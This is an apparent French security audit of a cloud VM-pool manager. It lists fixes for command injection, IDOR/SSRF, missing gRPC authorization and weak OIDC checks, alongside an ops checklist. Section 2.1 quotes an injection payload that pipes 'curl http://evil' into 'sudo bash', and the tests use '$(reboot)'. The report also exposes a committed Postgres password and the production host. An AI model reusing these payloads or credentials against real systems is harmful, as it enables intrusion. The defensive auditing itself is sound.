# Audit de sécurité — Cloud Pool Manager

**Date :** 29 juin 2026
**Périmètre :** control center (Go), microservice OpenStack (Go), frontend SvelteKit, reverse-proxy Caddy, chaîne d'auth (Dex/OIDC, GLAuth, Moodle, GitHub), cloud-init des VM.
**Prod auditée :** `https://vm-pool-manager.mesocentre.plateau-de-saclay.net` (VM `157.136.253.108`).
**Statut :** correctifs code **appliqués, testés et déployés en prod** ; actions résiduelles d'infrastructure listées en §4 (checklist OPS).

---

## 1. Synthèse

| Sévérité | Trouvées | Corrigées (code, déployé) | Action OPS requise |
|----------|----------|---------------------------|--------------------|
| Critique | 4 | 4 | 1 (rotation mot de passe) |
| Élevée | 6 | 5 | 3 |
| Moyenne | 5 | 4 | 2 |

Aucune faille critique ne reste ouverte côté code. Les éléments restants (§4) relèvent de l'exploitation (rotation de secrets, mots de passe par défaut de briques tierces, durcissement réseau) et ne nécessitent pas de modification du code.

Bonne surprise réseau : les ports backend (`50051` gRPC, `50052` microservice, `50055` REST) bindent sur toutes les interfaces **mais sont déjà bloqués depuis l'extérieur** par le security group OpenStack (vérifié : `50052`/`50055` injoignables depuis Internet, seul `443` répond). PostgreSQL, Dex, GLAuth, Moodle et Guacd écoutent en `127.0.0.1` uniquement.

---

## 2. Failles corrigées (code) — déployées en prod

### 2.1 — CRITIQUE — Injection de commande via clé SSH → RCE root sur les VM
- **Où :** `control_center/internal/attribvm/service.go` (`cmdInit`).
- **Problème :** le champ commentaire (libre, contrôlé par l'utilisateur) de la clé SSH était interpolé tel quel dans un script exécuté en **root** sur la VM. Un commentaire piégé (`…"; curl http://evil | sudo bash; "`) donnait une exécution de code arbitraire root.
- **Correctif :** la clé est transmise en **base64** (alphabet sans métacaractère shell) puis décodée côté VM (`PUBKEY="$(printf '%s' '<b64>' | base64 -d)"`). Plus aucune donnée attaquant-contrôlée n'atteint l'interpréteur shell.
- **Test de régression :** `internal/attribvm/service_security_test.go` (charges `$(reboot)`, backticks, sauts de ligne, fermeture d'apostrophe → toutes neutralisées).

### 2.2 — CRITIQUE — Fuite d'inventaire global à tout élève authentifié
- **Où :** `control_center/grpc/httpauth.go` (`adminHTTPPrefixes`).
- **Problème :** `/api/inventory` (toutes les VM, IP, noms d'élèves, URLs Guacamole/Grafana) n'était pas gaté → accessible à n'importe quel compte élève.
- **Correctif :** `/api/inventory` ajouté aux préfixes réservés à l'équipe pédagogique (`isStaff`). Vérifié en prod : `GET /api/inventory` sans rôle staff → **401/403**.
- **Test :** `grpc/httpauth_test.go` (`TestIsAdminPath`, `TestPublicHTTPPaths`).

### 2.3 — CRITIQUE — Pas d'autorisation par méthode sur le plan gRPC
- **Où :** `control_center/grpc/server.go`, nouveau `control_center/grpc/grpc_authz.go`.
- **Problème :** le serveur gRPC/gRPC-Web authentifiait (JWT OIDC) mais n'**autorisait** pas par méthode. Un principal OIDC de rôle non-staff pouvait appeler `ConfigService.CreateConfig` (cloud-init arbitraire = RCE) ou provisionner/détruire des pools.
- **Correctif :** intercepteurs `authzUnaryInterceptor`/`authzStreamInterceptor` (chaînés après l'auth OIDC) refusant aux rôles « student »/inconnu les méthodes sensibles : `ConfigService.{Create,Update,Delete}Config`, `PoolService.{CreatePool,DeletePool,RebuildServer,AddServer,AddSSHKeys,AddStudents,DeleteStudent,ListStudents}`, `AuthService.CreateUser`.
- **Test :** `grpc/grpc_authz_test.go` (`TestMethodDeniedForRole`).

### 2.4 — CRITIQUE — Inscription ouverte (`AuthService.CreateUser` public)
- **Où :** `control_center/grpc/server.go` (`publicMethods`).
- **Problème :** `CreateUser` était public → création d'un compte applicatif **et** d'un utilisateur GLAuth/LDAP, exploitable pour se connecter ensuite via Dex.
- **Correctif :** retiré des méthodes publiques + classé sensible (réservé à un principal authentifié non-étudiant).

### 2.5 — ÉLEVÉE — IDOR / SSRF sur `/api/app-status`, `/api/guac-url`, `/api/nbgrader/submit`
- **Où :** `control_center/grpc/inventory.go`, `grpc/nbgrader.go`.
- **Problème :** ces endpoints prenaient une IP arbitraire en paramètre → un élève pouvait sonder un port TCP sur une IP quelconque (oracle SSRF), récupérer l'URL Guacamole d'autrui, ou **geler** (`chmod a-w`) le travail d'un camarade du même pool.
- **Correctif :** helper `ipBelongsToCaller` (`grpc/inventory.go`) — staff : seulement une **VM connue** (jamais une IP arbitraire) ; élève : seulement **sa** VM attribuée. Appliqué aux trois endpoints.
- **Test :** `grpc/inventory_security_test.go` (entrée non-IP refusée, contexte non authentifié refusé).

### 2.6 — ÉLEVÉE — Clickjacking (suppression de X-Frame-Options/CSP par le proxy)
- **Où :** `control_center/grpc/proxy_session.go` (`serveAppProxy`).
- **Problème :** le reverse-proxy applicatif **supprimait** `X-Frame-Options` et `Content-Security-Policy` des réponses → framing cross-origin possible.
- **Correctif :** remplacés par une politique restrictive — `X-Frame-Options: SAMEORIGIN` + `Content-Security-Policy: frame-ancestors 'self'` (framing same-origin autorisé pour l'iframe interne, cross-origin bloqué).

### 2.7 — ÉLEVÉE — Validation OIDC incomplète (issuer/audience)
- **Où :** `control_center/internal/oidc/middleware.go` (`ParseToken`).
- **Problème :** la signature (JWKS) et l'algorithme (RS256) étaient vérifiés, mais **pas l'issuer** ni l'audience → un JWT d'un autre émetteur dont la signature passe le JWKS aurait pu être accepté.
- **Correctif :** `jwt.WithIssuer(OIDC_ISSUER)` imposé (vérifié aligné en prod : issuer Dex == `OIDC_ISSUER` à l'identique) + `jwt.WithAudience` activable via `OIDC_AUDIENCE` (opt-in, pour ne rien casser). Vérifié en prod : discovery annonce le bon issuer.

### 2.8 — ÉLEVÉE — Téléchargement du binaire registrar sans vérification TLS
- **Où :** `microservices/openstack/internal/jobs/utils.go`.
- **Problème :** le binaire `vm-registrar` (exécuté **root**) était téléchargé avec `curl -k` / `wget --no-check-certificate` → un MITM servant un faux binaire = RCE sur toute la flotte.
- **Correctif :** retrait de `-k`/`--no-check-certificate` sur le téléchargement du binaire (vérification TLS désormais obligatoire). *(La balise d'activité écriture-seule conserve `-k` — impact MITM limité à falsifier un statut connected/idle, cf. §4.)*

### 2.9 — MOYENNE — Authentification : fallback mot de passe en clair
- **Où :** `control_center/internal/auth/service.go` (`AuthenticateUser`).
- **Problème :** en cas d'échec bcrypt, comparaison de repli avec un mot de passe stocké **en clair**.
- **Correctif :** fallback supprimé — seul le hash bcrypt fait foi.

### 2.10 — MOYENNE — PKCE en mode `plain`
- **Où :** `frontend/src/lib/store/authStore.ts`.
- **Problème :** `code_challenge_method=plain` transmettait le verifier en clair dans l'URL d'autorisation (interceptable).
- **Correctif :** passage en **S256** (SHA-256 du verifier) dès que `crypto.subtle` est disponible (prod en HTTPS), repli `plain` uniquement en HTTP simple (dev). Vérifié : Dex annonce `S256` supporté.

### 2.11 — MOYENNE — En-têtes de sécurité absents sur l'application
- **Où :** `caddy/Caddyfile.domain` (prod), `caddy/Caddyfile`, `caddy/Caddyfile.native`.
- **Correctif :** ajout sur l'app (pas sur les chemins proxy iframe) de `Content-Security-Policy`, `X-Frame-Options: SAMEORIGIN`, `X-Content-Type-Options: nosniff`, `Referrer-Policy`, `Permissions-Policy`, suppression de l'en-tête `Server`. Vérifié en prod (tous présents). Polices Google whitelistées explicitement, tout le reste en `'self'`.

### 2.12 — Durcissements complémentaires
- **CORS gRPC-Web** : `WithOriginFunc` ne renvoyait plus systématiquement `true` → allowlist via `CORS_ALLOWED_ORIGINS` (réglée en prod sur le domaine + l'IP). `grpc/grpc_authz_test.go`.
- **TTL session Moodle** : 24 h → **12 h** (`grpc/httpauth.go`).
- **Cookie de session proxy** : `SameSite=Strict` (au lieu de Lax).
- **`crypto/rand`** : échec **fermé** (panic) si le générateur est indisponible, pour `randomToken`/`randomState` (plus de token prévisible).
- **Mot de passe de partage VS Code** : minimum 4 → **12** caractères (backend `grpc/vscode_grant.go` + UI).
- **cloud-init Postgres** (`cloud-init-postgres.yaml`) : mot de passe **retiré du dépôt** (placeholders), CIDR restreint (plus de `0.0.0.0/0`), `scram-sha-256` au lieu de `md5`.

---

## 3. Tests

8 nouveaux tests de sécurité/régression ajoutés, **suite complète au vert** (`go test ./...`) :

| Fichier | Couvre |
|---------|--------|
| `internal/attribvm/service_security_test.go` | Non-injection de la clé SSH (2.1) |
| `grpc/grpc_authz_test.go` | Role-gate gRPC + allowlist CORS (2.3, 2.12) |
| `grpc/httpauth_test.go` | Gating routes staff/public + isStaff (2.2) |
| `grpc/inventory_security_test.go` | Garde-fous IDOR/SSRF (2.5) |

Frontend : `npm run check` → 0 erreur.

---

## 4. Checklist OPS (actions d'exploitation — hors code)

> À réaliser par l'admin / la DSI. Ces points ne sont pas corrigeables par le code seul.

- [ ] **CRITIQUE — Roter le mot de passe PostgreSQL `admin`.** L'ancien (`P00lManager_Secure_2026`) a été committé dans le dépôt (et reste dans l'historique git). Bien que Postgres écoute en `127.0.0.1` uniquement, le mot de passe doit être changé : nouveau mot de passe fort → mettre à jour `control_center/.env`, `microservices/openstack/.env` (`REGISTRAR_PG_DSN`), puis `ALTER USER admin WITH PASSWORD …`. Idéalement, purger l'historique git (BFG/`git filter-repo`).
- [ ] **ÉLEVÉE — Mot de passe Guacamole par défaut.** Guacamole est exposé via `/guacamole/*` (domaine public). Vérifier que le compte `guacadmin/guacadmin` par défaut a été changé/supprimé.
- [ ] **ÉLEVÉE — Confirmer le filtrage des ports backend.** `50051`/`50052`/`50055` bindent sur `*`. Vérifié bloqués depuis l'extérieur par le security group ; **maintenir** cette règle (entrant autorisé : `443`, `80`, `22` depuis IP admin). Hardening optionnel : binder ces écouteurs en `127.0.0.1` (le control center et Caddy y accèdent via `localhost`).
- [ ] **ÉLEVÉE — Certificat TLS pour le control center vu des VM.** La balise d'activité VM→CC utilise encore `curl -k` (cert auto-signé sur IP). Exposer le CC aux VM via un domaine à certificat valide, puis retirer `-k` (`microservices/openstack/internal/jobs/utils.go`). Impact actuel limité (falsification de statut d'activité, ni RCE ni fuite).
- [ ] **MOYENNE — Activer l'enforcement d'audience OIDC.** Définir `OIDC_AUDIENCE=cloudpoolmanager` dans `control_center/.env` après confirmation que les jetons portent bien cette audience.
- [ ] **MOYENNE — Monitoring.** Aucun Grafana/Prometheus exposé sur cette VM (ports `3000`/`9090` absents). Si déployés ailleurs : changer le mot de passe Grafana par défaut, ne pas exposer `9090`/`3000`.
- [ ] **MOYENNE — Clés SSH des VM étudiantes.** Évaluer la rotation / l'usage de clés éphémères par attribution.
- [ ] **FAIBLE — Supprimer le chemin de login local legacy.** `AuthService.AuthenticateUser` reste public ; le jeton émis (`role:email:id`) n'est pas un JWT OIDC et n'ouvre aucun accès, mais ce chemin mort devrait être retiré (frontend `tryLogin`).

---

## 5. Risques résiduels acceptés

- **Jetons en `localStorage` (frontend).** Migration vers cookie HttpOnly non réalisée (refonte lourde du transport gRPC-Web Bearer, risque de régression élevé). Atténué par : CSP stricte (anti-XSS), TTL de session bornés, `SameSite=Strict` sur les cookies de proxy. À reconsidérer dans une itération dédiée.
- **`-k` sur la balise d'activité VM** (cf. §4) — impact limité, documenté.

---

## 6. Déploiement

Correctifs déployés sur la prod le 29/06/2026 (rsync → build Go/Caddy/SvelteKit → redémarrage systemd `vmpool-*`). Smoke-test validé :
en-têtes de sécurité présents, issuer OIDC aligné (login fonctionnel), `S256` annoncé, `/api/inventory` et `/api/admin/*` → 401, endpoint public → 200, gRPC-Web → 200. Sauvegarde de rollback : `/home/ubuntu/deploy-backup-20260629-083341` sur la VM (binaires, Caddyfile, .env, build frontend).

---

## 7. Audit externe Acunetix / Invicti (DSI) — 01/07/2026

Scan « Full Scan » sur `https://vm-pool-manager.mesocentre.plateau-de-saclay.net` : **0 critique, 0 haute, 2 moyennes, 2 basses, 6 informationnelles**. Corrections appliquées et déployées le 01/07 (uniquement dans `caddy/Caddyfile.domain` — reload gracieux Caddy, aucune coupure ; réversible via backups `Caddyfile.domain.bak-*`).

| # | Alerte (sévérité) | Correctif | Vérifié |
|---|---|---|---|
| 1 | **HSTS non activé** (Medium) | `Strict-Transport-Security: max-age=31536000; includeSubDomains` **site-wide** | HSTS présent sur `/`, `/student`, `/dex/*`, `/api/*` |
| 2 | **Open-redirect / href contrôlable via `back`** sur `/dex/auth/*` (Medium, CWE-79) | Matcher Caddy : rejet **400** de tout `back` contenant `:` ou `//` (le `back` légitime de Dex est vide). Binaire Dex non modifié. | `back=https://evil` → 400 (« Invalid back parameter ») ; `back=` vide → page Dex normale ; **login LDAP réel OK** |
| 3 | **`/metrics` Prometheus public** (Low, CWE-200) | `handle /metrics { respond 404 }` sur le domaine. Scraping interne = `localhost:50055/metrics`. | `/metrics` → 404 |
| 4 | **Pages sensibles cachables** (Low, CWE-524) | `Cache-Control: no-store` sur `/api/*` | présent sur `/api/*` |
| 5 | **CSP/XCTO/Permissions-Policy absents** sur `/dex/*`, `/auth/callback` (Info) | En-têtes sûrs déplacés au niveau site (toutes réponses) ; CSP ajoutée à `/dex/*` et `/auth/callback` | présents sur `/dex/auth/ldap` et `/auth/callback` |

**Informationnels acceptés (by design) :** `unsafe-inline` dans la CSP (requis par l'hydratation SvelteKit — supprimable via CSP à nonces, chantier ultérieur) ; `data:` (favicon SVG + polices) ; `default-src` (bonne pratique).

**Hors périmètre applicatif (contexte auditeur) :** LDAP en bind anonyme ouvert sur le réseau de l'X (`ldaps://ldap-{ens,lab,adm}.polytechnique.fr`, base `ou=utilisateurs,dc=id,dc=polytechnique,dc=edu`) — sujet **infra IDCS**, pas le code applicatif ; à traiter avec l'équipe IDCS.

**Note observabilité :** aucun Prometheus ne tourne sur la VM ; la cible configurée (`monitoring/prometheus/prometheus.yml`) est `129.104.125.190` (IP interne), pas le domaine public. Un futur monitoring doit scraper l'endpoint **en interne** (`localhost:50055`), jamais via le reverse-proxy public.
